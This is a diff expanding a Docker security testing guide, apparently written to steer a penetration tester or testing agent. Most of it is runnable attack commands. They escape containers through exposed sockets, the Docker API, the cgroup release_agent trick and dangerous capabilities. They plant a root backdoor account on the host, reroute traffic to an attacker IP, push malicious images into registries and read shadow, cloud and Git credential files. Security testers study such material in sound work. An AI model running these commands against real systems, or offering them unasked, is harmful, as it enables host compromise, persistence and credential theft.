@@ -1,83 +1,478 @@
 <docker_security_guide>
 <title>DOCKER SECURITY TESTING</title>
 
-<critical>Docker security testing covers socket exposure, container escape, privileged containers, image vulnerabilities, registry security, and API attacks. Critical for containerized applications.</critical>
+<critical>Docker containers are the foundation of modern cloud infrastructure. Misconfigurations like exposed Docker sockets, privileged containers, excessive capabilities, and insecure images can lead to complete host compromise. Container escapes are among the most impactful vulnerabilities, enabling lateral movement across the entire container infrastructure. Registry compromise can inject malicious images into CI/CD pipelines.</critical>
 
 <scope>
 - Docker socket exposure (/var/run/docker.sock)
-- Container escape techniques
+- Container escape techniques (privileged, capabilities, cgroups)
 - Privileged container exploitation
-- Image vulnerability scanning
-- Registry security
-- Docker API attacks
-- Secrets in environment variables
-- Capability abuse
+- Capability abuse (SYS_ADMIN, SYS_PTRACE, NET_ADMIN)
+- Image vulnerability scanning and analysis
+- Registry security and image signing
+- Docker API attacks (remote and local)
+- Secrets exposure (environment variables, build args, layers)
+- Namespace breakout (pid, net, ipc, user)
+- Docker Content Trust bypass
+- Container runtime vulnerabilities (runc, containerd)
+- Build-time security issues (Dockerfile analysis)
 </scope>
 
 <methodology>
-1. Check for Docker socket exposure
-2. Test for privileged containers
-3. Attempt container escape
-4. Scan images for vulnerabilities
-5. Test Docker API security
-6. Check for exposed secrets
+1. Enumerate container environment and privileges.
+2. Check for Docker socket exposure and accessibility.
+3. Analyze container capabilities and security context.
+4. Test for namespace isolation weaknesses.
+5. Scan container images for vulnerabilities.
+6. Check for secrets in environment variables and layers.
+7. Test Docker API authentication and authorization.
+8. Attempt container escape using available primitives.
 </methodology>
 
+<testing_techniques>
 <socket_exposure>
 {% raw %}
-# Docker socket exposure:
-ls -la /var/run/docker.sock
-# If accessible, can control Docker daemon
+# Docker Socket Exposure Testing
 
-# Exploit via curl:
+# 1. Check if socket is accessible inside container
+ls -la /var/run/docker.sock
+stat /var/run/docker.sock
+
+# 2. Query Docker API via socket
+curl --unix-socket /var/run/docker.sock http://localhost/version
+curl --unix-socket /var/run/docker.sock http://localhost/info
 curl --unix-socket /var/run/docker.sock http://localhost/containers/json
 
-# Create privileged container:
+# 3. List all containers (including host containers)
+curl --unix-socket /var/run/docker.sock http://localhost/containers/json?all=true
+
+# 4. Create privileged container to escape
 curl --unix-socket /var/run/docker.sock -X POST \
   -H "Content-Type: application/json" \
-  -d '{"Image":"alpine","Cmd":["sh"],"Privileged":true}' \
-  http://localhost/containers/create
+  -d '{
+    "Image": "alpine",
+    "Cmd": ["/bin/sh"],
+    "Privileged": true,
+    "HostConfig": {
+      "Binds": ["/:/host"],
+      "Privileged": true
+    }
+  }' \
+  http://localhost/containers/create?name=pwned
 
-# Container escape via socket:
-docker run -v /var/run/docker.sock:/var/run/docker.sock alpine sh
-# Inside container, control host Docker
+# Start the container
+curl --unix-socket /var/run/docker.sock -X POST \
+  http://localhost/containers/pwned/start
+
+# Attach to container
+curl --unix-socket /var/run/docker.sock -X POST \
+  http://localhost/containers/pwned/attach?stream=1&stdin=1&stdout=1&stderr=1
+
+# 5. Alternative: Use Docker CLI if available
+docker -H unix:///var/run/docker.sock run -it --privileged -v /:/host alpine chroot /host
+
+# 6. Mount host filesystem via socket
+curl --unix-socket /var/run/docker.sock -X POST \
+  -H "Content-Type: application/json" \
+  -d '{
+    "Image": "alpine",
+    "Cmd": ["cat", "/host/etc/shadow"],
+    "HostConfig": {"Binds": ["/:/host"]}
+  }' \
+  http://localhost/containers/create?name=reader
+
+# 7. Check for TCP socket exposure
+curl http://TARGET:2375/version
+curl http://TARGET:2376/version
+
+# Remote Docker API (if exposed)
+docker -H tcp://TARGET:2375 ps
+docker -H tcp://TARGET:2375 run -it --privileged alpine sh
 {% endraw %}
 </socket_exposure>
 
-<container_escape>
+<container_escape_techniques>
 {% raw %}
-# Privileged container escape:
-docker run --privileged -it alpine sh
-# Mount host filesystem:
+# Container Escape Techniques
+
+# 1. PRIVILEGED CONTAINER ESCAPE
+# Check if privileged
+cat /proc/self/status | grep CapEff
+# CapEff: 0000003fffffffff = privileged
+
+# Mount host filesystem
+fdisk -l  # List disks
 mkdir /mnt/host
-mount /dev/sda1 /mnt/host
+mount /dev/sda1 /mnt/host  # Or /dev/vda1, /dev/xvda1
 chroot /mnt/host
 
-# Capability abuse:
-# CAP_SYS_ADMIN allows escape
-docker run --cap-add=SYS_ADMIN -it alpine sh
+# Add backdoor to host
+echo "attacker:x:0:0::/root:/bin/bash" >> /mnt/host/etc/passwd
+echo "attacker:$(openssl passwd -1 password):18000:0:99999:7:::" >> /mnt/host/etc/shadow
 
-# cgroup escape:
-# Exploit cgroup notifications
+# 2. CAP_SYS_ADMIN ESCAPE (cgroup release_agent)
+# Check for CAP_SYS_ADMIN
+capsh --print | grep sys_admin
+
+# Cgroup escape
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "cat /etc/shadow > $host_path/shadow" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+# 3. CAP_SYS_PTRACE ESCAPE
+# Check for CAP_SYS_PTRACE
+capsh --print | grep sys_ptrace
+
+# Inject into host process
+# Find a host process (SSH, init)
+ps aux | grep sshd
+# Use gdb or custom injector to inject shellcode
+
+# 4. CAP_NET_ADMIN ESCAPE
+# Check for CAP_NET_ADMIN
+capsh --print | grep net_admin
+
+# Can manipulate host networking
+# ARP spoofing, route manipulation
+ip route add default via ATTACKER_IP
+
+# 5. HOSTPID NAMESPACE ESCAPE
+# If hostPID: true
+ls /proc/1/root/  # Access host root via init process
+cat /proc/1/root/etc/shadow
+nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
+
+# 6. HOSTNETWORK ESCAPE
+# If hostNetwork: true
+# Access host network, including localhost services
+curl http://127.0.0.1:10250/pods  # Kubelet
+curl http://169.254.169.254/latest/meta-data/  # Cloud metadata
+
+# 7. DOCKER-IN-DOCKER ESCAPE
+# If /var/run/docker.sock mounted
+docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh
 {% endraw %}
-</container_escape>
+</container_escape_techniques>
 
-<common_payloads>
+<capability_exploitation>
 {% raw %}
-# Socket access:
-curl --unix-socket /var/run/docker.sock http://localhost/containers/json
+# Capability Analysis and Exploitation
 
-# Privileged escape:
-mkdir /mnt/host && mount /dev/sda1 /mnt/host
+# 1. List current capabilities
+cat /proc/self/status | grep Cap
+capsh --print
 
-# Secrets in env:
-docker inspect <container_id> | grep -i password
+# 2. Decode capabilities
+capsh --decode=0000003fffffffff
 
-# Image vulnerabilities:
-docker scan image:tag
-trivy image image:tag
+# Dangerous capabilities:
+# CAP_SYS_ADMIN - Near-root, cgroup escape
+# CAP_SYS_PTRACE - Process injection, debug
+# CAP_NET_ADMIN - Network manipulation
+# CAP_NET_RAW - Raw sockets, sniffing
+# CAP_DAC_OVERRIDE - Bypass file permissions
+# CAP_DAC_READ_SEARCH - Read any file
+# CAP_SETUID/SETGID - Change user/group
+# CAP_MKNOD - Create device nodes
+# CAP_SYS_MODULE - Load kernel modules
+# CAP_SYS_RAWIO - Direct I/O access
+
+# 3. CAP_DAC_READ_SEARCH exploitation
+# Can read any file regardless of permissions
+cat /etc/shadow  # Even without root
+
+# 4. CAP_SETUID exploitation
+# Change to root
+python3 -c "import os; os.setuid(0); os.system('/bin/sh')"
+
+# 5. CAP_NET_RAW exploitation
+# Sniff network traffic
+tcpdump -i eth0
+
+# 6. CAP_MKNOD exploitation
+# Create device nodes
+mknod /dev/sda b 8 0
+mount /dev/sda /mnt
+
+# 7. Check default dropped capabilities
+# Docker drops many by default, but --privileged adds all
 {% endraw %}
-</common_payloads>
+</capability_exploitation>
 
-<remember>Docker security: Check socket exposure (full control), test privileged containers (easy escape), scan images for CVEs, look for secrets in environment variables, validate API authentication.</remember>
+<image_security>
+{% raw %}
+# Docker Image Security Analysis
+
+# 1. Scan image for vulnerabilities
+trivy image TARGET_IMAGE:TAG
+grype TARGET_IMAGE:TAG
+docker scan TARGET_IMAGE:TAG
+
+# 2. Extract and analyze image layers
+docker save TARGET_IMAGE:TAG -o image.tar
+tar -xvf image.tar
+# Each layer is a tarball, extract and search
+
+# 3. Find secrets in layers
+for layer in */layer.tar; do
+  tar -tvf "$layer" | grep -E "\.env|password|secret|key|credential"
+done
+
+# 4. Check image history for build args
+docker history TARGET_IMAGE:TAG --no-trunc
+# Build args might contain secrets!
+
+# 5. Inspect image for environment secrets
+docker inspect TARGET_IMAGE:TAG | jq '.[0].Config.Env'
+
+# 6. Check for setuid binaries
+docker run --rm TARGET_IMAGE:TAG find / -perm -4000 2>/dev/null
+
+# 7. Analyze Dockerfile if available
+# Look for:
+# - Running as root
+# - Exposed ports
+# - ADD/COPY sensitive files
+# - Hardcoded secrets
+# - Using latest tag
+
+# 8. Check base image vulnerabilities
+docker inspect TARGET_IMAGE:TAG | jq '.[0].Config.Labels["org.opencontainers.image.base.name"]'
+{% endraw %}
+</image_security>
+
+<registry_security>
+{% raw %}
+# Docker Registry Security Testing
+
+# 1. Check for anonymous access
+curl -s https://registry.target.com/v2/_catalog
+curl -s https://registry.target.com/v2/IMAGE_NAME/tags/list
+
+# 2. Pull images without auth
+docker pull registry.target.com/IMAGE_NAME:TAG
+
+# 3. Check for HTTP registry (insecure)
+curl -s http://registry.target.com/v2/
+
+# 4. Enumerate images via API
+curl -s https://registry.target.com/v2/_catalog | jq '.repositories[]'
+
+# For each repository, list tags:
+curl -s https://registry.target.com/v2/REPO/tags/list | jq '.tags[]'
+
+# 5. Download manifest (contains layer digests)
+curl -s https://registry.target.com/v2/REPO/manifests/TAG
+
+# 6. Download layer blobs
+curl -s https://registry.target.com/v2/REPO/blobs/sha256:DIGEST -o layer.tar
+
+# 7. Check for push access (image injection)
+# If you can push, inject malicious image
+docker tag malicious:latest registry.target.com/REPO:TAG
+docker push registry.target.com/REPO:TAG
+
+# 8. Registry API authentication bypass
+# Try different auth methods:
+curl -u '' https://registry.target.com/v2/
+curl -H "Authorization: Bearer " https://registry.target.com/v2/
+
+# 9. Docker Content Trust bypass
+# Check if DCT is enforced
+DOCKER_CONTENT_TRUST=0 docker pull registry.target.com/IMAGE:TAG
+
+# 10. ECR/GCR/ACR specific tests
+# AWS ECR
+aws ecr describe-repositories
+aws ecr get-authorization-token
+
+# GCP GCR
+gcloud container images list
+
+# Azure ACR
+az acr repository list --name REGISTRY
+{% endraw %}
+</registry_security>
+
+<docker_api_attacks>
+{% raw %}
+# Docker API Attack Techniques
+
+# 1. Remote API discovery
+nmap -p 2375,2376 TARGET
+curl http://TARGET:2375/version
+
+# 2. Execute commands in running containers
+curl -X POST http://TARGET:2375/containers/CONTAINER_ID/exec \
+  -H "Content-Type: application/json" \
+  -d '{"Cmd": ["cat", "/etc/passwd"], "AttachStdout": true}'
+
+# Start exec and capture output
+curl -X POST http://TARGET:2375/exec/EXEC_ID/start \
+  -H "Content-Type: application/json" \
+  -d '{"Detach": false, "Tty": false}'
+
+# 3. Create container with mounted host filesystem
+curl -X POST http://TARGET:2375/containers/create \
+  -H "Content-Type: application/json" \
+  -d '{
+    "Image": "alpine",
+    "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow"],
+    "HostConfig": {"Binds": ["/:/host"]}
+  }'
+
+# 4. Build malicious image
+curl -X POST http://TARGET:2375/build?t=backdoor \
+  -H "Content-Type: application/tar" \
+  --data-binary @malicious.tar
+
+# 5. Commit changes to create backdoor image
+curl -X POST "http://TARGET:2375/commit?container=CONTAINER_ID&repo=backdoor"
+
+# 6. Access Docker events (information disclosure)
+curl http://TARGET:2375/events
+
+# 7. Get system information
+curl http://TARGET:2375/info
+curl http://TARGET:2375/version
+{% endraw %}
+</docker_api_attacks>
+
+<secrets_exposure>
+{% raw %}
+# Finding Secrets in Docker Environments
+
+# 1. Environment variables (most common)
+docker inspect CONTAINER_ID | jq '.[0].Config.Env'
+cat /proc/1/environ | tr '\0' '\n'
+
+# Look for:
+# DATABASE_PASSWORD, API_KEY, SECRET_KEY, AWS_ACCESS_KEY_ID
+# STRIPE_SECRET_KEY, SENDGRID_API_KEY, JWT_SECRET
+
+# 2. Secrets in running processes
+ps auxe | grep -E "password|key|secret|token"
+
+# 3. Docker secrets (Swarm)
+ls /run/secrets/
+cat /run/secrets/*
+
+# 4. Kubernetes secrets mounted as files
+ls /var/run/secrets/kubernetes.io/serviceaccount/
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+
+# 5. Build-time secrets in history
+docker history --no-trunc IMAGE_NAME
+
+# 6. Secrets in labels
+docker inspect CONTAINER_ID | jq '.[0].Config.Labels'
+
+# 7. Files commonly containing secrets
+find / -name "*.env" -o -name ".env*" -o -name "*.pem" -o -name "*.key" 2>/dev/null
+cat /app/.env
+cat /etc/secrets/*
+
+# 8. Cloud provider credentials
+cat ~/.aws/credentials
+cat ~/.config/gcloud/credentials.db
+cat ~/.azure/credentials
+
+# 9. Git credentials
+cat ~/.git-credentials
+cat ~/.gitconfig
+{% endraw %}
+</secrets_exposure>
+
+<namespace_isolation>
+{% raw %}
+# Namespace Isolation Testing
+
+# 1. Check current namespaces
+ls -la /proc/self/ns/
+
+# 2. PID namespace isolation
+# Can you see host processes?
+ps aux | wc -l  # Low count = isolated
+ps aux | grep -v "container"  # Look for host processes
+
+# 3. Network namespace isolation
+ip a  # Check interfaces
+ip route  # Check routes
+# Can you access host network?
+ping 169.254.169.254  # Cloud metadata
+curl http://localhost:10250  # Kubelet
+
+# 4. Mount namespace isolation
+mount | head  # What's mounted?
+cat /proc/mounts | grep -E "hostPath|/host"
+
+# 5. User namespace
+id  # Are you root?
+cat /proc/self/uid_map  # User mapping
+
+# 6. IPC namespace
+ipcs  # Shared memory, semaphores
+# Can access host IPC?
+
+# 7. UTS namespace
+hostname  # Same as host?
+uname -n
+
+# 8. Cgroup namespace
+cat /proc/self/cgroup
+# Check cgroup limits and paths
+{% endraw %}
+</namespace_isolation>
+</testing_techniques>
+
+<validation>
+1. Confirm socket access by successfully querying Docker API.
+2. Verify container escape by executing commands on host.
+3. Test capability exploitation by performing privileged operations.
+4. Validate image vulnerabilities by confirming CVE applicability.
+5. Confirm registry access by pulling/pushing images.
+6. Verify secrets exposure by using discovered credentials.
+7. Test namespace isolation by accessing host resources.
+</validation>
+
+<false_positives>
+- Docker socket mounted read-only (limited exploitation)
+- Privileged container with user namespace remapping (contained root)
+- Capabilities granted but seccomp blocking syscalls
+- Image vulnerabilities in unused packages/libraries
+- Registry allows anonymous read but not write (limited impact)
+- Container appears privileged but AppArmor/SELinux restricts
+- Host path mounted but to non-sensitive directory
+</false_positives>
+
+<impact>
+- Complete host compromise via container escape
+- Lateral movement to other containers via socket access
+- Credential theft from environment variables and secrets
+- Supply chain attacks through registry compromise
+- Data exfiltration via privileged network access
+- Persistent access through backdoored images
+- Cluster-wide compromise in orchestrated environments
+- Cryptomining via compromised container resources
+</impact>
+
+<pro_tips>
+1. Always check for Docker socket - it's the #1 container escape vector.
+2. Check /proc/self/status CapEff for capabilities - privileged = all capabilities.
+3. Container escape often chains multiple weaknesses - check all vectors.
+4. Image layers can contain secrets deleted in later layers - extract all.
+5. Docker-in-Docker setups almost always have escapes - prioritize testing.
+6. Look for --privileged in docker inspect output - immediate red flag.
+7. Cloud metadata service (169.254.169.254) is often reachable from containers.
+8. Check for user namespace remapping - it significantly limits root impact.
+9. Build args are stored in image history - never use for secrets.
+10. Test with multiple tools (trivy, grype, snyk) - they find different issues.
+</pro_tips>
+
+<remember>Docker containers are only as secure as their configuration. Socket exposure and privileged mode are instant compromise. Always assume containers are hostile environments - apply defense in depth. Image security is supply chain security - verify and scan everything. Escape techniques evolve - stay current with container runtime CVEs.</remember>
 </docker_security_guide>
